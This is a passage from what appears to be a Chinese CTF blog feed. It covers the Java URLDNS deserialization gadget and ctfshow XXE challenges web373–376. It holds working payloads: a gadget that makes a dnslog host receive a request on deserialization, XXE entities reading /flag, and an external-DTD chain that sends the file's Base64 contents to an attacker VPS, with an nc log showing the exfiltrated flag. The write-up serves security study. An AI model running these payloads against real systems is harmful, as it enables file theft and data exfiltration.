&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">tarURL</span> <span class="operator">=</span> <span class="string">&quot;http://qdgj5w.dnslog.cn&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(tarURL);</span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>正常来说当运行 main 函数时不会访问URL，但实际上运行的结果是会访问URL的。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705913035776-ba8b7b09-5761-4a22-ad4c-b150a34bc108.png" alt="image.png"><br>为什么呢，因为HashMap的put方法中就已经调用了hashCode函数：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>其中的hash()：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>hashCode会被初始化设定为-1.<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705913461604-8214e6ce-89b4-45b9-8904-d4fd859ae638.png" alt="image.png"><br>如果在put方法中执行一次，导致其不再是-1，就无法进入后面的handler的hashCode。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705913412666-b77e9157-9983-4d30-a486-139748902adc.png" alt="image.png"><br>这就会导致不执行handler的hashCode。<br>也就是：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设定 hashCode = -<span class="number">1</span></span><br><span class="line">↓</span><br><span class="line">hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">↓</span><br><span class="line">hashcode = url的hashCode</span><br></pre></td></tr></table></figure>无法在serialize中触发。<br>我们可以测试一下在发序列化中是否触发：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Deserialize</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;ser.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        deserialize(filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>运行之后并没有收到请求。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705914084629-ec29f1ac-515a-482d-8d34-a5f827f99fd7.png" alt="image.png"><br>也就是说我们目前的问题就变成了：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="comment">// * 正常使用这个会导致开始的时候访问一次，让这里不要发起请求</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(tarURL);</span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// * 在这里将hashCode改回-1</span></span><br><span class="line">        serialize(hashMap);</span><br></pre></td></tr></table></figure>其中这里将hashCode改回1就用到了反射，那反射是什么呢？<h2 id="正射和反射"><a href="#正射和反射" class="headerlink" title="正射和反射"></a>正射和反射</h2>要想知道什么是反射，那就要先了解什么是正射：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Player</span> <span class="variable">boogipop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Player</span>();</span><br><span class="line">boogipop.playGame(<span class="string">&quot;GENSHIN&quot;</span>);</span><br></pre></td></tr></table></figure>也就是先实例化对象，然后对对象进行操作。<br>而反射与正射不同，比如你并不知道原来所实例化的对象是什么。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> boogipop.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> class1.getMethod(<span class="string">&quot;playGame&quot;</span>, String.class);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> class1.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line">method1.invoke(object, <span class="string">&quot;GENSHIN&quot;</span>);</span><br></pre></td></tr></table></figure>示例代码：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">        <span class="comment">// * 反射就是对Class进行操作</span></span><br><span class="line">        <span class="comment">// * 从抽象类Class中实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        <span class="comment">// * 获取构造器 比如需要传入什么参数</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">// * 传入参数，生成对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) constructor.newInstance(<span class="string">&quot;Boogipop&quot;</span>, <span class="number">6</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        <span class="comment">// * 获取参数</span></span><br><span class="line">        Field[] personFields = c.getFields();</span><br><span class="line">        <span class="comment">// * 获取所有参数 包括private protected等</span></span><br><span class="line">        Field[] personFields1 = c.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field f:personFields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// * 根据变量名获取</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">// * 允许访问</span></span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(person, <span class="string">&quot;Berial&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        <span class="comment">// * 调用方法</span></span><br><span class="line">        Method[] method = c.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method1:method)&#123;</span><br><span class="line">            System.out.println(method1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// * 获取方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;playGame&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// * 执行方法</span></span><br><span class="line">        actionMethod.invoke(person, <span class="string">&quot;GENSHIN&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h2>知道了反射，就可以使用反射修改其中的hashCode。<br>也就是这样：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">    <span class="comment">// * 正常使用这个会导致开始的时候访问一次，让这里不要发起请求</span></span><br><span class="line">    <span class="comment">// * 如果hashCode已经是-1了就不会发起请求</span></span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(tarURL);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 随便赋值一个不是-1就行</span></span><br><span class="line">    hashCode.set(url, <span class="number">1</span>);</span><br><span class="line">    hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// * 在这里将hashCode改回-1</span></span><br><span class="line">    hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">    serialize(hashMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>在反序列化之后我们才收到请求：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705918481578-104f0ce8-3145-4649-9786-3f06e25186dc.png" alt="image.png"><br>完整代码：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="comment">// * 记得去掉后面的/</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">tarURL</span> <span class="operator">=</span> <span class="string">&quot;http://test&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="comment">// * 正常使用这个会导致开始的时候访问一次，让这里不要发起请求</span></span><br><span class="line">        <span class="comment">// * 如果hashCode已经是-1了就不会发起请求</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(tarURL);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 随便赋值一个不是-1就行</span></span><br><span class="line">        hashCode.set(url, <span class="number">1</span>);</span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// * 在这里将hashCode改回-1</span></span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Deserialize</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;ser.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        deserialize(filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><blockquote><p>ctfshow web846</p></blockquote></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705919075679-2e31b01d-31d4-4658-88c8-7ec122a03666.png" alt="image.png"><br>修改serialize代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>来方便查看输出的内容。<br>post传入输出的内容即可：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705919699691-9b7f04cb-a231-41c6-b870-4e7ea3731298.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web373-web378XXE篇</title>
      <link href="/2023/12/08/web373-web378XXE%E7%AF%87/"/>
      <url>/2023/12/08/web373-web378XXE%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="知识了解"><a href="#知识了解" class="headerlink" title="知识了解"></a>知识了解</h1><blockquote><p>可以参考这个：<br><a href="https://blog.csdn.net/hk41666/article/details/125832666">https://blog.csdn.net/hk41666/article/details/125832666</a><br><a href="https://blog.csdn.net/weixin_44420143/article/details/118721145">https://blog.csdn.net/weixin_44420143/article/details/118721145</a></p></blockquote><p>XXE(XML外部实体注入)是一种针对XML文档的攻击方式,能够使攻击者利用XML解析器的漏洞读取本地文件或者远程请求。<br>XXE攻击的原理是:</p><ul><li>XML文档可以包含DOCTYPE定义,里面可以引用外部实体。</li><li>XML解析器在解析文档时,会根据DOCTYPE中的引用去获取外部资源。</li><li>攻击者可以构造恶意的外部实体引用,让解析器去读取本地文件,或者发起请求到内网服务器。</li><li>如果解析器没有禁用外部实体的加载,就可能导致文件内容泄露或远程代码执行。</li></ul><p>XXE攻击的危害包括:</p><ul><li>读取系统敏感文件,如/etc/passwd</li><li>利用文件协议读取本地文件</li><li>端口扫描、对内网网站进行攻击</li><li>攻击内网应用、数据库</li><li>执行远程代码,调用恶意脚本</li></ul><p>防范XXE攻击的方法:</p><ul><li>对不可信XML输入进行验证,过滤….\等威胁</li><li>禁用解析器的外部实体加载功能</li><li>使用安全的XML解析器,如defuse xml等</li><li>避免上传XML文件或禁用DOCTYPE</li><li>输出时进行过滤,移除POTENTIAL XXE payload<h1 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE  xxe [</span><br><span class="line">&lt;!ENTITY xee SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;aaa&gt;</span><br><span class="line">&lt;ctfshow&gt;</span><br><span class="line">&amp;xee;</span><br><span class="line">&lt;/ctfshow&gt;</span><br><span class="line">&lt;/aaa&gt;</span><br></pre></td></tr></table></figure><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1700380608870-4cb380a0-e59b-42ee-9889-bb2a1cbf780d.png" alt="image.png"><h1 id="web374-web376"><a href="#web374-web376" class="headerlink" title="web374-web376"></a>web374-web376</h1>无回显，需要创建一条外带信道来提取数据。<br>创建一个1.php内容：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>xxe.dtd文件：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % dtd <span class="string">&quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://[vps-ip]/1.php?file=%file;&#x27;&gt; &quot;</span>&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % aaa SYSTEM <span class="string">&quot;http://[vps-ip]/xxe.dtd&quot;</span>&gt;</span><br><span class="line">%aaa;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;<span class="number">123</span>&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>将两个外部实体 (%file 和 %aaa) 引入 XML 文档中<br>%file 定义了一个实体，用于读取位于 /flag 路径下的文件并对其进行 base64 编码，则该文件的内容将以 base64编码的形式显示在 XML 响应中。<br>%aaa 定义了一个实体，指向远程 XML 文档。如果能够成功地利用此漏洞执行 XXE 攻击，则远程 XML 文档的内容将被解析并包含在XML 响应中。<br>payload中创建两个实体 通过%aaa访问了xxe.dtd<br>然后在xxe.dtd中引用了1.php，在1.php中实现了将get传入的file值输出在text.txt中，此时的get值就是payload中定义的file的实体的值，也就是说这里实现了对于flag文件的读取并且传递值给了file变量<br>~~但是这个我就是成功不了，test.txt出来的是index.php页面。 ~~docker的权限不足，给那个www目录足够权限即可。<br>剩余的<br>于是又再网上找了个打法：<br>payload<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % aaa SYSTEM <span class="string">&quot;http://xxx/test.dtd&quot;</span>&gt;</span><br><span class="line">%aaa;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;<span class="number">1</span>&lt;/root&gt;</span><br></pre></td></tr></table></figure>test.dtd:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % dtd <span class="string">&quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://xxx:8888/%file;&#x27;&gt; &quot;</span>&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br><span class="line"></span><br></pre></td></tr></table></figure>这个8888端口监听一下内容：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@iZf8z6xc36jyvoqjdvolkiZ www]<span class="comment"># nc -lvnp 8888</span></span><br><span class="line">Ncat: Version <span class="number">7.91</span> ( https:<span class="comment">//nmap.org/ncat )</span></span><br><span class="line">Ncat: Listening on :::<span class="number">8888</span></span><br><span class="line">Ncat: Listening on <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">8888</span></span><br><span class="line">Ncat: Connection <span class="keyword">from</span> <span class="number">124.223</span>.<span class="number">158.81</span>.</span><br><span class="line">Ncat: Connection <span class="keyword">from</span> <span class="number">124.223</span>.<span class="number">158.81</span>:<span class="number">48628</span>.</span><br><span class="line">GET /Y3Rmc2hvd3swOWU5NTllMy1iZGJmLTRlZTktOTc2Ni00NWE3ODQ2YWNjYWJ9Cg== HTTP/<span class="number">1.0</span></span><br><span class="line">Host: <span class="number">47.115</span>.<span class="number">204.101</span>:<span class="number">8888</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>解码一下其中的base64文本。得到flag。<h1 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span 